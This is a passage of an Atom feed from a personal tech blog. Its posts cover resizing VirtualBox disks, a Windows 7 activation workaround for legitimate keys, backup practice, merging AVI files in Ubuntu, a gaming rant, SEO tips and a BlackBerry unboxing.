+&lt;/pre&gt;&lt;/div&gt;</summary><category term="Ubuntu"></category><category term="LAMP"></category><category term="Linux"></category><category term="Apache"></category><category term="MySQL"></category><category term="PHP"></category></entry><entry><title>Increasing the Size of a Virtual Hard Drive in VirtualBox</title><link href="http://blog.chriskankiewicz.com/increasing-the-size-of-a-virtual-hard-drive-in-virtualbox.html" rel="alternate"></link><published>2011-11-16T08:59:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2011-11-16:increasing-the-size-of-a-virtual-hard-drive-in-virtualbox.html</id><summary type="html">&lt;p&gt;I work in Linux primarily but run a Windows 7 virtual machine in VirtualBox so I
+can use Photoshop and do some necessary testing. Today my VM ran out of space.
+Silly me thought 20GB would be enough, but after installing service pack 1,
+dozens of Windows updates and a few programs I had less than 1GB of space left.
+After a little searching I found an easy way to increase the size of a virtual
+disk.&lt;/p&gt;
+&lt;p&gt;First, shut down your VM then run the following command from your host PC:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ VBoxManage modifyhd /path/to/guest.vdi --resize &amp;lt;size_in_mb&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Once completed, boot into your VM and (for Windows) open up Control Panel -&amp;gt;
+Administrative Tools -&amp;gt; Computer Management. In Computer Management navigate to
+Storage -&amp;gt; Disk Management then, in the right pane, right click your disk and
+select "Extend Volume" and follow the prompts to resize your disk. And that's
+it! Your disk will now be resized.&lt;/p&gt;
+&lt;p&gt;This also works from a Windows host, you just have to locate and use
+VBoxManage.exe&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This method only allows you to INCREASE the size of a virtual disk.
+You cannot shrink one with this method.&lt;/p&gt;</summary><category term="Virtual Machine"></category><category term="VirtualBox"></category><category term="VM"></category><category term="Windows 7"></category><category term="Development"></category></entry><entry><title>Windows 7 Activation Hack</title><link href="http://blog.chriskankiewicz.com/windows-7-activation-hack.html" rel="alternate"></link><published>2011-07-19T21:18:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2011-07-19:windows-7-activation-hack.html</id><summary type="html">&lt;p&gt;When installing Windows 7 it's very picky about which installation disc you use
+(Full vs. Upgrade) and if improperly matched with your key can prevent you from
+activating your copy of Windows usually returning an "Invalid Product Key" error
+message.  You may also see the same or similar error when you do a full, clean
+installation with an upgrade disc.  This can be very annoying, especially when
+you have a legitimate key and disc but just didn't install it the way Microsoft
+thinks you should.  In the event that you are having trouble activating your
+Windows 7 installation with a legitimate key, try the following registry hack:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;First make sure there are no pending tasks requiring a reboot.This is
+     indicated by an orange shield icon next to your shutdown button on the
+     Start menu or in the notification tray.&lt;/li&gt;
+&lt;li&gt;Open the Registry Editor (Start -&amp;gt;  search for "regedit" and hit Enter)&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Navigate to the following registry key:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\OOBE
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Double click on &lt;code&gt;MediaBootInstall&lt;/code&gt; in the right pane and change
+     "Value data" to &lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;Open a command prompt with administrative rights (Start -&amp;gt;  search for
+     "cmd" and hit Enter)&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Run the following command to reset Windows activation status:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;slmgr -rearm
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Reboot your computer.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;Run the Activate Windows utility (Start -&amp;gt; search for "Activate Windows"),
+     enter your upgrade product key and activate Windows.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; This activation hack will only work if you have a legitimate key.
+This method wont help if you have a pirated copy of Windows.&lt;/p&gt;</summary><category term="Activation"></category><category term="Hack"></category><category term="Microsoft"></category><category term="Regedit"></category><category term="Registry"></category><category term="Windows 7"></category></entry><entry><title>The 3-2-1 Backup Rule</title><link href="http://blog.chriskankiewicz.com/the-3-2-1-backup-rule.html" rel="alternate"></link><published>2011-07-13T14:29:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2011-07-13:the-3-2-1-backup-rule.html</id><summary type="html">&lt;p&gt;Too many people today don't backup their files. And of those that do, many don't
+do it well. An easy way to remember a "safe" way to backup your data is with the
+"3-2-1 Backup Rule" which goes like this:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Keep &lt;strong&gt;3 copies&lt;/strong&gt; of any important files (your primary/working copy counts
+    as one)&lt;/li&gt;
+&lt;li&gt;Store your files on &lt;strong&gt;2 different media types&lt;/strong&gt; (Example: Hard drive and in
+    the Cloud)&lt;/li&gt;
+&lt;li&gt;Always have &lt;strong&gt;1 copy off site&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;With the 3-2-1 rule you can be relatively confident that you'll always be able
+to access your critical data, even after a catastrophic failure.&lt;/p&gt;
+&lt;p&gt;Another rule I live by when it comes to backup is:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The only good backup is an automatic backup.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;If you're backups aren't automated, there's a good chance you'll forget to run
+them or (in my case) just be lazy about it and think, "I'll back it up
+tomorrow." at which point a failure occurs and you're shit out of luck.&lt;/p&gt;
+&lt;p&gt;For those of you without a backup plan in place, I'd like to recommend a service
+I use, &lt;a href="http://www.crashplan.com/"&gt;CrashPlan&lt;/a&gt;. CrashPlan allows you to backup to
+any of your own computers that also have CrashPlan installed for free. You can
+also backup to local folders and external drives and (with a little hacking)
+network drives as well. For a (reasonable) price, CrashPlan also supports
+limited and unlimited online backup plans. Clients are available for Windows,
+Linux and Mac operating systems, so it should work for any system you currently
+own. For more info and to download CrashPlan go to
+&lt;a href="http://www.crashplan.com"&gt;http://www.crashplan.com&lt;/a&gt;&lt;/p&gt;</summary><category term="Backup"></category><category term="CrashPlan"></category></entry><entry><title>Join multiple .avi files in Ubuntu</title><link href="http://blog.chriskankiewicz.com/join-multiple-avi-files-in-ubuntu.html" rel="alternate"></link><published>2010-12-29T18:24:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2010-12-29:join-multiple-avi-files-in-ubuntu.html</id><summary type="html">&lt;p&gt;I was just in a bit of a pickle and needed to join two .avi files together while
+in Ubuntu.  There are a number of solutions out there, but the most simple
+solution I could find was via &lt;code&gt;avimerge&lt;/code&gt;. Here's how I did it.&lt;/p&gt;
+&lt;h2&gt;Install avimerge&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get update
+sudo apt-get install transcode-utils
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Merge your files&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;avimerge -i input_file1.avi input_file2.avi -o output_file.avi
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It's as simple as that. I did this in Ubuntu 10.10, but this should work for
+older versions as well.&lt;/p&gt;</summary><category term="AVI"></category><category term="Transcode"></category><category term="Ubuntu"></category><category term="Video"></category></entry><entry><title>Gaming, Then and Now</title><link href="http://blog.chriskankiewicz.com/gaming-then-and-now.html" rel="alternate"></link><published>2010-09-23T14:53:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2010-09-23:gaming-then-and-now.html</id><summary type="html">&lt;p&gt;My brother is currently attending the DigiPen School of Technology working on a
+degree in video game programming / design. He's an avid gamer but has missed
+some of (IMO) the best games of all time, specifically, the Half-Life saga.
+Naturally, I email him recommending these games in the hope of inspiring him or,
+at the very least, giving him a better understanding of some of the good games
+he's missed out on and where the industry came from. I even offered to buy the
+games for him if he didn't want to pay for them himself. Well, he acquired the
+first Half-Life game and started playing it. This was his response:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Hey Chris, just wanted to let you know that I tried out Half-Life today.  I'm
+sorry, but that game just sucks in my opinion.  I know a lot of people loved it,
+but I can't stand it.  There are too many things that kill you instantly (I just
+died from hitting a doodad that looked like a barrel) or hurt you without
+letting you know (green laser beams at the beginning for example).  I hated that
+I had to get really close to an enemy just to hit him, and when I did they would
+turn to me and hit me.  It was very hard to hit the head crabs as well.  By the
+way, yes, I know that I had a gun, but I had very limited ammo.  Also, I hated
+virtually never knowing where to go or what to do.  Some of the buttons that you
+need to push in that game are very tiny or off to the side where you can't see
+them.  I know the game is old, but it seems very poorly designed to me.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This got me thinking, most modern games suck. These games are targeted at the
+general population, not the avid gamer. The AI are dumbed way down, there are
+big signs or floating arrows everywhere telling you which way to go, and the
+games are generally too easy. They don't give you a sense of figuring things out
+on your own anymore and don't give you a sense of accomplishment. Not to mention
+the story of most of these games are boring and do not engage the player. Now
+contrast this with the games from our youth. Most of these games were difficult
+and many didn't give you any clear path to follow. Here's a list of several
+games I enjoyed playing when I was younger.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Any Super Mario Bros. Game pre 1990  &lt;/li&gt;
+&lt;li&gt;Battletoads  &lt;/li&gt;
+&lt;li&gt;Duck Hunt  &lt;/li&gt;
+&lt;li&gt;Metroid  &lt;/li&gt;
+&lt;li&gt;Super Metroid  &lt;/li&gt;
+&lt;li&gt;Legend of Zelda  &lt;/li&gt;
+&lt;li&gt;Zelda: A Link to the Past  &lt;/li&gt;
+&lt;li&gt;Zelda: Occarina of Time  &lt;/li&gt;
+&lt;li&gt;Super Mario RPG  &lt;/li&gt;
+&lt;li&gt;Sim Ant  &lt;/li&gt;
+&lt;li&gt;Sim City  &lt;/li&gt;
+&lt;li&gt;Doom  &lt;/li&gt;
+&lt;li&gt;Heroes of Might and Magic  &lt;/li&gt;
+&lt;li&gt;Perfect Dark  &lt;/li&gt;
+&lt;li&gt;Command &amp;amp; Conquer: Red Alert  &lt;/li&gt;
+&lt;li&gt;Star Craft&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I could go on. Compared to modern games almost all of these games were
+relatively hard, had few if any clear paths to take and some even had things
+that would kill you instantly (Bowsers fireballs). Also, many other early NES
+games were nearly impossible to beat without the use of cheats or game altering
+devices (See the &lt;a href="http://www.cinemassacre.com/category/avgn/" title="The Angry
+Video Game Nerd"&gt;AVGN&lt;/a&gt;). Now think about the countless hours you spent playing these
+games and the pure enjoyment you got from playing them. To this day I've never
+beaten the original Mario Bros, Battletoads or Metroid, yet I still enjoy
+playing them from time to time regardless of their difficulty.&lt;/p&gt;
+&lt;p&gt;In a world where there's several new (shitty) games out every week and many of
+those titles have a sequel released within a year, I truly appreciate game
+companies like &lt;a href="http://www.valvesoftware.com/" title="Valve Software"&gt;Valve&lt;/a&gt; and
+&lt;a href="http://www.gearboxsoftware.com" title="Gearbox Software"&gt;Gearbox&lt;/a&gt; and the independent
+developers like &lt;a href="http://www.minecraft.net" title="Minecraft"&gt;Notch&lt;/a&gt; and fear for a
+future where game developers don't enjoy, or at least respect, the games that
+we/they have grown up with.&lt;/p&gt;</summary><category term="Nintendo"></category><category term="Rant"></category><category term="Valve"></category></entry><entry><title>Search Engine Optimization Tips</title><link href="http://blog.chriskankiewicz.com/search-engine-optimization-tips.html" rel="alternate"></link><published>2010-04-14T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2010-04-14:search-engine-optimization-tips.html</id><summary type="html">&lt;p&gt;Search engine ranking and your web sites traffic are directly influenced by four
+main areas:&lt;/p&gt;
+&lt;h2&gt;Content, Links, Popularity and Reputation&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Content:&lt;/strong&gt; The more unique, well-versed content a site has, the better it will
+rank. Content primarily consists of the text on your site, but also includes
+images, videos and anything else the users come to the site for.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Links:&lt;/strong&gt; Mainly concerning inbound links, but also includes outbound links and
+internal links. The more, quality, inbound links a site has, the better it will
+rank.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Popularity:&lt;/strong&gt; The more people that know about your site the better it will
+rank and the more traffic you will receive. Popularity is often measured by the
+number of inbound links to a site.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Reputation:&lt;/strong&gt; Popularity alone is worthless without a good reputation. If a
+site is known by many to be of poor quality or of little to no use to the users
+it will not rank well.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;10 SEO Tips Relevant to All Websites&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Content is king, period. Make sure you have good, well-written and unique
+     content focused on your primary keyword or keyword phrase.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;One keyword phrase per page. Don’t try to optimize a page for several
+     keywords.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use a unique, keyword-focused Title tag on ever page. Do not stuff the
+     title with unneeded keywords.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Match page content to Title text.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Natural language content ranks better with search engines. Don’t stuff your
+     text with keywords. This method does not work and can hurt your rankings.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use keywords and keyword phrases appropriately in text links and image ALT
+     attributes.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Quality inbound links are better than many poor links (which can actually
+     hurt you). “Remember, if there is no good, logical reason for that site to
+     link to you, you don’t want the link.”&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Don’t be obsessed with PageRank. It is just one part of several attributes
+     that go into the ranking algorithm. A site with a low PageRank can outrank
+     one with a high PageRank.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Search engines like fresh content (ie – Deal of the Day, blog, etc.), be
+     sure to add new, useful content to your pages regularly.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Understand social marketing. It IS part of SEO (Yelp, Facebook, Twitter,
+     etc). Building good customer relations through social marketing will help
+     build your sites reputation.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You will never get over-night results from SEO optimization. Be
+patient. It could be several weeks or more before you notice any change in
+ranking.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;Other SEO Tips to consider&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Use SEO Friendly URLs. (ie – yourdomain.com/spacelys-sprockets.htm)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Every website should have a sitemap, but not rely on it. A search engine
+     should be able to find every page on its own.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Eliminate those nasty 404s. No one likes getting to a page that isn’t
+     there.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Avoid duplicate content and/or duplicate URLs pointing to the same content.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;</summary><category term="HTML"></category><category term="Search Engine Optimization"></category><category term="SEO"></category><category term="Tips"></category><category term="Web Development"></category></entry><entry><title>Beginers Guide To Search Engine Optimization</title><link href="http://blog.chriskankiewicz.com/beginers-guide-to-search-engine-optimization.html" rel="alternate"></link><published>2009-11-20T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2009-11-20:beginers-guide-to-search-engine-optimization.html</id><summary type="html">&lt;p&gt;The following is a quick list of optimizations that, in my years of web
+development, I have observed will help increase your sites search engine
+ranking. While none of these processes are guaranteed to make your site #1 in
+Google overnight, I can promise that by implementing all (or even some) of these
+items, in time your site's rank will rise.&lt;/p&gt;
+&lt;p&gt;The following items are clean, honest ways to optimize your site. I do not
+condone, nor solicit, any form of "black hat" search engine optimization and
+frown upon it greatly. If that's what you're aiming to implement, I sincerely
+hope that Google blacklists your site tomorrow. Please don't send me any emails
+asking how to get your sight listed as #1 tomorrow.&lt;/p&gt;
+&lt;p&gt;Now, onto the list.&lt;/p&gt;
+&lt;h2&gt;Code to Standards&lt;/h2&gt;
+&lt;p&gt;Whether or not you're aiming for SEO, keeping your code standards compliant will
+make your site better all around and help make post-development changes much
+simpler. While the effectiveness of coding to standards is still debated in the
+SEO community, it's generally believed that a standards compliant page will rank
+slightly higher than a non-compliant page with the same content.&lt;/p&gt;
+&lt;p&gt;Also, by adhering to standards, you'll have a much easier time implementing the
+rest of the processes on this list.&lt;/p&gt;
+&lt;h2&gt;Content is King&lt;/h2&gt;
+&lt;p&gt;The first and foremost rule you'll hear from many SEO "experts" mouth will most
+likely be "content is king." Of all the processes detailed on this page, if your
+site doesn't contain valuable content to the end user, your page rank will
+likely not be very high.&lt;/p&gt;
+&lt;p&gt;To take this concept one step further, I'm going to add to that saying to create
+my own spin off. As opposed to just "content", my saying specifies that "dynamic
+content is king." While a site with any content at all is far superior to one
+without, I believe that adding something as simple as a twitter feed to your
+home page will help convince the search engines that your site is more
+important. After all, users (and therefore, probably search engines) love new
+content. To expand upon this idea, if it would fit your site, try adding a blog
+or a forum to keep that content fresh.&lt;/p&gt;
+&lt;h2&gt;Separate Content and Style&lt;/h2&gt;
+&lt;p&gt;When a search engine crawls your site, it doesn't see the same thing your end
+use sees. The search engine sees the underlying code that is output by your
+site. For an example of what the search engine sees, right click your web page
+and choose "View Source." This is a much more accurate (though not exact)
+representation of what the search engine sees.&lt;/p&gt;
+&lt;p&gt;If you clutter your code with multitudes of nested tables and lots of in-line
+styling properties the search engine may have a hard time finding your content
+to index. Instead of nesting table after table, consider using divs. If you
+don't know how to use divs, I strongly suggest you learn. Also, instead of
+adding the "style" property in line with your (X)HTML, create a separate file
+named style.css and add the following code between your pages head tags to call
+this file upon page load:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;style.css&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/link&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;All you have to do now is add your CSS elements to this style.css file, and give
+your (X)HTML element either a class or id. For more on classes and ids, see
+&lt;a href="http://www.w3schools.com/Css/css_syntax.asp"&gt;http://www.w3schools.com/Css/css_syntax.asp&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;Use Human Readable URL's&lt;/h2&gt;
+&lt;p&gt;The ability for a user to accurately guess what a page will contain by looking
+at a link will not only help your users find what they're looking for, but is
+also a good SEO technique. See below for an example of human readable URL's.&lt;/p&gt;
+&lt;p&gt;Good Examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;www.domain.com/dog-food&lt;/li&gt;
+&lt;li&gt;www.domain.com/dog/food&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Poor Examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;www.domain.com/1337&lt;/li&gt;
+&lt;li&gt;www.domain.com/index.php?page=1337&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Page Title Format&lt;/h2&gt;
+&lt;p&gt;While it may not seem too important, the title of your page can make a
+difference to your page ranking. While a title in the format of "Site Name |
+Page Title" is in no way bad, it's generally believed that the best format for a
+tile is "Page Title | Site Name." Also, there are many pages out there that list
+every directory in their title, this is not necessary and clutters the title so
+readers have a tougher time identifying the page.&lt;/p&gt;
+&lt;p&gt;Good examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SEO Guide | Web Geek&lt;/li&gt;
+&lt;li&gt;CK-Gallery • Web Geek&lt;/li&gt;
+&lt;li&gt;Menu – Taco Bell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Poor examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Web Geek | SEO Guide&lt;/li&gt;
+&lt;li&gt;Web Geek &amp;gt; Web Development &amp;gt; SEO Guide&lt;/li&gt;
+&lt;li&gt;www.web-geek.net | projects | php | ck-gallery&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Header Tag Prioritization&lt;/h2&gt;
+&lt;p&gt;The importance of a title should directly affect which header tag that title
+gets (ie &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt;. &lt;code&gt;&amp;lt;h2&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;h3&amp;gt;&lt;/code&gt;, etc...).  The more important a title is, the
+closer to &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt; the title should be with &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt; being the page title and
+something like a paragraph heading being an &lt;code&gt;&amp;lt;h2&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;h3&amp;gt;&lt;/code&gt; depending on it's
+importance.  If one topic is just as important as another, they should have the
+same title tag.&lt;/p&gt;
+&lt;h2&gt;Create a Sitemap&lt;/h2&gt;
+&lt;p&gt;Every website with more than a single page should have a sitemap. You can make a
+sitemap in many ways and in many formats, though the most widely accepted by
+most search engines is an XML sitemap.&lt;/p&gt;
+&lt;p&gt;My favorite site for sitemap generation is
+&lt;a href="http://www.xml-sitemaps.com/"&gt;http://www.xml-sitemaps.com/&lt;/a&gt;. This site will
+automatically crawl up to 500 pages and generate XML, GZipped, and HTML sitemaps
+that you can then upload to your own site. Once you have uploaded your sitemap,
+head on over to
+&lt;a href="https://www.google.com/webmasters/tools"&gt;https://www.google.com/webmasters/tools&lt;/a&gt;
+and add your sitemap for Google to index.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Even though you can put a sitemap anywhere, the most common location
+for a sitemap is in your sites root directory
+(&lt;code&gt;http://www.web-geek.net/sitemap.xml&lt;/code&gt;)&lt;/p&gt;
+&lt;h2&gt;Use Relevant Keywords&lt;/h2&gt;
+&lt;p&gt;Keywords are a difficult area in SEO. You need to specify keywords relevant to
+your site but you don't want to have too many keywords or you'll be hurting your
+site more than helping. The generally accepted maximum number of keywords to
+include on your page is usually 10, for most sites, and definitely no more than
+20 for larger sites. Though major search engines don't take the number of
+keywords on your page into consideration when assigning you a page rank, by
+having to many keywords, it's harder for a search engine to identify which ones
+are more relevant than others.&lt;/p&gt;
+&lt;p&gt;To include keywords on your page, place the following code between your head
+tags.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;keywords&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;keyword 1, keyword 2, keyword 3&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/meta&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Also, you generally don't want the exact same keywords on any pages unless
+they're content matches. Give each page keywords that are relevant to the
+content on that page. You also may wish to consider generating your keywords
+dynamically.&lt;/p&gt;
+&lt;h2&gt;Use the "title" Attribute for Links&lt;/h2&gt;
+&lt;p&gt;When creating a link, be sure to include a relevant description of the link
+using the title attribute. This adds content for a search engine to pick up and
+also, when a user hovers over that link, they will get a popup showing your
+description.&lt;/p&gt;
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.web-geek.net/ck-gallery&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;title=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Dynamic PHP Photo Gallery&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;CK-Gallery&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The above code will create the following link (hover over it to see the title):
+&lt;a href="http://www.web-geek.net/ck-gallery" title="Dynamic PHP Photo Gallery"&gt;CK-Gallery&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Submit your site for indexing&lt;/h2&gt;
+&lt;p&gt;One of the best ways to get your site noticed by a search engine is to manually
+submit it for indexing to major search engines. This is especially useful when
+your site isn't yet listed in a search engine.&lt;/p&gt;
+&lt;p&gt;Google: &lt;a href="http://www.google.com/addurl/"&gt;http://www.google.com/addurl/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Yahoo:
+&lt;a href="http://siteexplorer.search.yahoo.com/submit"&gt;http://siteexplorer.search.yahoo.com/submit&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Create a robots.txt file&lt;/h2&gt;
+&lt;p&gt;A robots.txt file can be used to limit what directories/files a web robot can
+access. This helps prevent a robot from accessing data you do not wish to be
+cached by search engines and instead cache only the pages you want to appear. A
+good resource on creating and using a robots.txt file can be found at
+&lt;a href="http://www.robotstxt.org/robotstxt.html"&gt;http://www.robotstxt.org/robotstxt.html&lt;/a&gt;.&lt;/p&gt;</summary><category term="Search Engine Optimization"></category><category term="SEO"></category><category term="Tips"></category><category term="Web Development"></category></entry><entry><title>First Friday script updated and simplified</title><link href="http://blog.chriskankiewicz.com/first-friday-script-updated-and-simplified.html" rel="alternate"></link><published>2009-02-14T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2009-02-14:first-friday-script-updated-and-simplified.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; The latest version of this script can always be found here:
+&lt;a href="https://github.com/PHX2600/FirstFriday"&gt;https://github.com/PHX2600/FirstFriday&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;With this update I have drastically reduced and simpified the code to produce
+the same results. I did some rigorous testing of my own to make sure this script
+will calculate the correct date, but that doesn’t mean it’s bullet-proof. If you
+find a bug, please email me so I can fix it.&lt;/p&gt;
+&lt;h3&gt;first-friday.php&lt;/h3&gt;
+&lt;p&gt;Somewhere along the lines of moving my blog from one site/platform to another I
+lost this sample of code. See link above for the latest version of this script.&lt;/p&gt;</summary><category term="PHX2600"></category><category term="Code"></category><category term="First Friday"></category><category term="PHP"></category><category term="Web Development"></category></entry><entry><title>BlackBerry Storm Unboxing</title><link href="http://blog.chriskankiewicz.com/blackberry-storm-unboxing.html" rel="alternate"></link><published>2008-12-15T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2008-12-15:blackberry-storm-unboxing.html</id><summary type="html">&lt;p&gt;I went to the Verizon store at 10am the day of release and they said they had
+sold out ~2 hours before I got there. I was able to order one and they were nice
+enough to write off the rebate right away and overnight me a Storm directly from
+the factory. By noon the following day I had my Storm and the following are
+photos of the unboxing. I know this is rather late, but like they say, better
+late than never.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="The Cover" src="{filename}/images/blackberry-storm-unboxing/the-cover.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="The Box" src="{filename}/images/blackberry-storm-unboxing/the-box.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Just Inside the Box" src="{filename}/images/blackberry-storm-unboxing/just-inside-the-box.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="THE STORM!" src="{filename}/images/blackberry-storm-unboxing/the-storm.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Under the Cover" src="{filename}/images/blackberry-storm-unboxing/under-the-cover.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Booting Up" src="{filename}/images/blackberry-storm-unboxing/booting-up.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;After my phone finished booting I forgot all about taking pictures. The
+following pictures were taken about a week later after I had been using the
+phone for a while.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Up and Running" src="{filename}/images/blackberry-storm-unboxing/up-and-running.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Anyone Got the Time?" src="{filename}/images/blackberry-storm-unboxing/anyone-got-the-time.jpg" /&gt;&lt;/p&gt;
